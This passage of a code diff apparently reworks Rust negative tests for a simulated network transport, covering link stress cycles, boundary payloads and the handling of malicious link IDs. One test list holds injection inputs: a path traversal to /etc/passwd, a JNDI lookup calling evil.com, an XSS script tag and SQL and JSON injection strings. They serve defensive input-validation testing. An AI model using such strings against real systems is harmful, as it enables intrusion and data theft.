+
+        #[test]
+        fn negative_concurrent_link_operations_state_consistency() {
+            // Test concurrent-like link operations that might expose race conditions
+            let mut vt = VirtualTransport::new(3333);
+
+            // Rapid creation/destruction cycles
+            for cycle in 0..100 {
+                let link_count = (cycle % 10) + 1; // 1-10 links per cycle
+                let mut created_links = Vec::new();
+
+                // Create multiple links rapidly
+                for i in 0..link_count {
+                    let link_id = format!("concurrent_{}_{}", cycle, i);
+                    let config = LinkFaultConfig {
+                        drop_probability: (i as f64) / 10.0,
+                        reorder_depth: i * 10,
+                        corrupt_bit_count: i,
+                        delay_ticks: (i as u64) * 5,
+                        partition: false,
+                    };
+
+                    let create_result = vt.create_link(
+                        &link_id,
+                        &format!("src_{}", i),
+                        &format!("tgt_{}", i),
+                        config,
+                    );
+
+                    match create_result {
+                        Ok(_) => {
+                            created_links.push(link_id);
+                        }
+                        Err(err) => {
+                            // Link creation failure is acceptable under stress
+                            assert!(
+                                !err.to_string().is_empty(),
+                                "Creation error should be meaningful"
+                            );
+                        }
+                    }
+                }
+
+                // Rapid message sending on all created links
+                for (msg_idx, link_id) in created_links.iter().enumerate() {
+                    for j in 0..5 {
+                        let payload = format!("concurrent_msg_{}_{}_{}", cycle, msg_idx, j)
+                            .as_bytes()
+                            .to_vec();
+                        let send_result = vt.send_message(link_id, &payload);
+
+                        // Send may fail if link was destroyed or has issues
+                        match send_result {
+                            Ok(_) => {
+                                // Success is fine
+                            }
+                            Err(err) => {
+                                // Should be meaningful error
+                                assert!(
+                                    err.to_string().contains("link")
+                                        || err.to_string().contains("partition")
+                                        || err.to_string().contains("capacity"),
+                                    "Send error should be meaningful: {}",
+                                    err
+                                );
+                            }
+                        }
+                    }
+                }
+
+                // Advance tick to process messages
+                vt.advance_tick(cycle as u64 + 1);
+
+                // Collect messages from all targets
+                for i in 0..link_count {
+                    let delivered = vt.collect_delivered_messages(&format!("tgt_{}", i));
+
+                    // Verify delivered messages are well-formed
+                    for msg in &delivered {
+                        assert!(
+                            !msg.payload.is_empty(),
+                            "Delivered payload should not be empty"
                         );
                         assert!(
                             msg.tick_created <= vt.current_tick(),
-                            "Creation tick should be valid: {}",
-                            test_name
+                            "Creation tick should be valid"
                         );
                         assert!(
-                            msg.tick_delivered.is_some(),
-                            "Delivery tick should be set: {}",
+                            msg.tick_delivered.unwrap_or(0) <= vt.current_tick(),
+                            "Delivery tick should be valid"
+                        );
+                    }
+                }
+
+                // Rapid destruction of half the links
+                for (idx, link_id) in created_links.iter().enumerate() {
+                    if idx % 2 == 0 {
+                        let destroy_result = vt.destroy_link(link_id);
+                        // Destruction may fail if link already destroyed or has issues
+                        match destroy_result {
+                            Ok(_) => {
+                                // Success is fine
+                            }
+                            Err(err) => {
+                                assert!(
+                                    err.to_string().contains("link")
+                                        || err.to_string().contains("not found"),
+                                    "Destroy error should be meaningful: {}",
+                                    err
+                                );
+                            }
+                        }
+                    }
+                }
+            }
+
+            // Final consistency check
+            let event_log = vt.event_log();
+            assert!(
+                event_log.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES,
+                "Event log should respect capacity limits"
+            );
+
+            for event in event_log {
+                assert!(
+                    !event.event_code.is_empty(),
+                    "Event code should not be empty"
+                );
+                assert!(
+                    event.tick <= vt.current_tick(),
+                    "Event tick should be valid"
+                );
+            }
+
+            // Transport should still be functional after stress test
+            let final_config = LinkFaultConfig::default();
+            assert!(
+                vt.create_link(
+                    "final_consistency_test",
+                    "final_src",
+                    "final_tgt",
+                    final_config
+                )
+                .is_ok(),
+                "Transport should be functional after concurrent operations"
+            );
+        }
+
+        #[test]
+        fn negative_payload_boundary_attacks_comprehensive() {
+            // Test message payloads designed to exploit boundary conditions
+            let mut vt = VirtualTransport::new(4444);
+
+            let config = LinkFaultConfig::default();
+            vt.create_link("payload_test", "payload_src", "payload_tgt", config)
+                .unwrap();
+
+            let boundary_payloads = vec![
+                // Empty payloads
+                ("empty", vec![]),
+                // Single byte boundaries
+                ("single_null", vec![0x00]),
+                ("single_max", vec![0xFF]),
+                // Power-of-2 sizes that might expose buffer issues
+                ("size_256", vec![0x42; 256]),
+                ("size_1024", vec![0x43; 1024]),
+                ("size_4096", vec![0x44; 4096]),
+                ("size_65536", vec![0x45; 65536]),
+                // Alternating bit patterns
+                ("alternating_aa", vec![0xAA; 1000]),
+                ("alternating_55", vec![0x55; 1000]),
+                (
+                    "alternating_pattern",
+                    (0..1000)
+                        .map(|i| if i % 2 == 0 { 0xAA } else { 0x55 })
+                        .collect(),
+                ),
+                // Sequential patterns
+                (
+                    "sequential_bytes",
+                    (0..256u8).cycle().take(1000).collect::<Vec<u8>>(),
+                ),
+                (
+                    "reverse_bytes",
+                    (0..256u8).rev().cycle().take(1000).collect::<Vec<u8>>(),
+                ),
+                // Boundary value patterns
+                ("all_zeros", vec![0x00; 1000]),
+                ("all_ones", vec![0xFF; 1000]),
+                ("null_terminated", b"payload\x00hidden\x00data".to_vec()),
+                // UTF-8 boundary cases
+                ("utf8_valid", "Hello, 世界! 🦀".as_bytes().to_vec()),
+                ("utf8_incomplete", vec![0xF0, 0x9F, 0xA6]), // Incomplete UTF-8 sequence
+                ("utf8_overlong", vec![0xC0, 0x80]),         // Overlong encoding
+                // Binary data that might be mistaken for text
+                ("fake_json", br#"{"evil": true, "payload": "#.to_vec()),
+                ("fake_xml", b"<payload>evil</payload>".to_vec()),
+                // Control character sequences
+                ("escape_sequences", b"\x1B[31m\x1B[2J\x1B[H".to_vec()),
+                ("mixed_control", b"normal\x00\x01\x02\x7F\x80\xFF".to_vec()),
+                // Very large payload (if memory allows)
+                ("large_payload", vec![0x99; 1_000_000]),
+            ];
+
+            for (test_name, payload) in boundary_payloads {
+                let send_result = vt.send_message("payload_test", &payload);
+
+                match send_result {
+                    Ok(message_id) => {
+                        // Message accepted - verify it's processed correctly
+                        assert!(
+                            message_id > 0,
+                            "Message ID should be positive: {}",
                             test_name
                         );
 
-                        if let Some(delivery_tick) = msg.tick_delivered {
-                            assert!(
-                                delivery_tick >= msg.tick_created,
-                                "Delivery should be >= creation: {}",
+                        vt.advance_tick(1);
+                        let delivered = vt.collect_delivered_messages("payload_tgt");
+
+                        if !delivered.is_empty() {
+                            let msg = &delivered[0];
+
+                            // Verify payload integrity
+                            assert_eq!(
+                                msg.payload.len(),
+                                payload.len(),
+                                "Payload length should be preserved: {}",
+                                test_name
+                            );
+                            assert_eq!(
+                                msg.payload, payload,
+                                "Payload content should be preserved: {}",
+                                test_name
+                            );
+
+                            // Verify metadata is reasonable
+                            assert_eq!(
+                                msg.source, "payload_src",
+                                "Source should be correct: {}",
+                                test_name
+                            );
+                            assert_eq!(
+                                msg.target, "payload_tgt",
+                                "Target should be correct: {}",
                                 test_name
                             );
                             assert!(
-                                delivery_tick <= vt.current_tick(),
-                                "Delivery should be <= current tick: {}",
+                                msg.tick_created <= vt.current_tick(),
+                                "Creation tick should be valid: {}",
                                 test_name
+                            );
+                            assert!(
+                                msg.tick_delivered.is_some(),
+                                "Delivery tick should be set: {}",
+                                test_name
+                            );
+
+                            if let Some(delivery_tick) = msg.tick_delivered {
+                                assert!(
+                                    delivery_tick >= msg.tick_created,
+                                    "Delivery should be >= creation: {}",
+                                    test_name
+                                );
+                                assert!(
+                                    delivery_tick <= vt.current_tick(),
+                                    "Delivery should be <= current tick: {}",
+                                    test_name
+                                );
+                            }
+                        }
+                    }
+                    Err(err) => {
+                        // Some boundary payloads may be rejected - verify meaningful error
+                        if test_name == "large_payload" {
+                            // Large payloads may legitimately be rejected
+                            assert!(
+                                err.to_string().contains("size")
+                                    || err.to_string().contains("large")
+                                    || err.to_string().contains("capacity"),
+                                "Large payload error should be meaningful: {}",
+                                err
+                            );
+                        } else {
+                            // Other boundary cases should generally be accepted.
+                            assert!(
+                                test_name == "large_payload",
+                                "Unexpected rejection of boundary payload {test_name}: {err}"
                             );
                         }
                     }
                 }
-                Err(err) => {
-                    // Some boundary payloads may be rejected - verify meaningful error
-                    if test_name == "large_payload" {
-                        // Large payloads may legitimately be rejected
-                        assert!(
-                            err.to_string().contains("size")
-                                || err.to_string().contains("large")
-                                || err.to_string().contains("capacity"),
-                            "Large payload error should be meaningful: {}",
-                            err
-                        );
-                    } else {
-                        // Other boundary cases should generally be accepted.
-                        assert!(
-                            test_name == "large_payload",
-                            "Unexpected rejection of boundary payload {test_name}: {err}"
-                        );
-                    }
-                }
             }
-        }
 
-        // Verify transport is still functional after boundary tests
-        let normal_payload = b"normal_test_payload".to_vec();
-        assert!(
-            vt.send_message("payload_test", &normal_payload).is_ok(),
-            "Normal payloads should work after boundary tests"
-        );
-    }
+            // Verify transport is still functional after boundary tests
+            let normal_payload = b"normal_test_payload".to_vec();
+            assert!(
+                vt.send_message("payload_test", &normal_payload).is_ok(),
+                "Normal payloads should work after boundary tests"
+            );
+        }
     } // end #[cfg(any())] mod removed_virtual_transport_api_tests (FIXME bd-yom8c)
 
     #[cfg(test)]
@@ -6186,7 +6193,10 @@ mod additional_comprehensive_negative_tests {
                 let create_result = vt.create_link("corrupt_test", "peer", fault_config);
 
                 if create_result.is_ok() {
-                    assert_eq!(vt.links["corrupt_test->peer"].config.corrupt_bit_count, bit_count);
+                    assert_eq!(
+                        vt.links["corrupt_test->peer"].config.corrupt_bit_count,
+                        bit_count
+                    );
                 }
             }
 
@@ -6246,18 +6256,18 @@ mod additional_comprehensive_negative_tests {
 
             // Attack 1: Link ID injection attacks
             let malicious_link_ids: Vec<String> = vec![
-                "".to_string(),                                 // Empty link ID
-                "../../etc/passwd".to_string(),                 // Path traversal
-                "${jndi:ldap://evil.com}".to_string(),          // JNDI injection
-                "\x00\x01\u{00FF}\x7F".to_string(),             // Binary data
-                "link_with\nlines\rand\ttabs".to_string(),      // Control characters
-                "very_long_link_id_".repeat(10000),             // Memory exhaustion
-                "unicode_link_🦀_🔒_⚡".to_string(),            // Unicode injection
+                "".to_string(),                                                 // Empty link ID
+                "../../etc/passwd".to_string(),                                 // Path traversal
+                "${jndi:ldap://evil.com}".to_string(),                          // JNDI injection
+                "\x00\x01\u{00FF}\x7F".to_string(),                             // Binary data
+                "link_with\nlines\rand\ttabs".to_string(), // Control characters
+                "very_long_link_id_".repeat(10000),        // Memory exhaustion
+                "unicode_link_🦀_🔒_⚡".to_string(),       // Unicode injection
                 r#"","injected_field":"malicious_value","evil":""#.to_string(), // JSON injection
-                "<script>alert('xss')</script>".to_string(),    // XSS attempt
-                "DROP TABLE links;--".to_string(),              // SQL injection attempt
-                "link->with->arrows".to_string(), // Special characters used in link format
-                "normal_link_id".to_string(),     // Normal case for comparison
+                "<script>alert('xss')</script>".to_string(), // XSS attempt
+                "DROP TABLE links;--".to_string(),         // SQL injection attempt
+                "link->with->arrows".to_string(),          // Special characters used in link format
+                "normal_link_id".to_string(),              // Normal case for comparison
             ];
 
             for malicious_id in malicious_link_ids {
@@ -6368,7 +6378,11 @@ mod additional_comprehensive_negative_tests {
                 let stress_result = stress_vt.create_link(&stress_id, "peer", base_config.clone());
 
                 if stress_result.is_ok() {
-                    assert!(stress_vt.links.contains_key(&format!("{}->peer", stress_id)));
+                    assert!(
+                        stress_vt
+                            .links
+                            .contains_key(&format!("{}->peer", stress_id))
+                    );
                 } else {
                     // May hit capacity limits
                     break;
@@ -6803,7 +6817,8 @@ mod additional_comprehensive_negative_tests {
             let mut first_round_ids = Vec::new();
             for i in 0..50 {
                 let payload = format!("first_round_{}", i).as_bytes().to_vec();
-                if let Ok(id) = recycling_vt.send_message("recycling_test", "peer", payload.clone()) {
+                if let Ok(id) = recycling_vt.send_message("recycling_test", "peer", payload.clone())
+                {
                     first_round_ids.push(id);
                 }
                 recycling_vt.advance_tick(1);
@@ -7058,7 +7073,8 @@ mod additional_comprehensive_negative_tests {
             // Send messages near boundary
             for i in 0..150 {
                 let payload = format!("boundary_test_{}", i).as_bytes().to_vec();
-                let send_result = boundary_vt.send_message("boundary_stats", "peer", payload.clone());
+                let send_result =
+                    boundary_vt.send_message("boundary_stats", "peer", payload.clone());
 
                 if send_result.is_ok() {
                     // Check for proper overflow handling
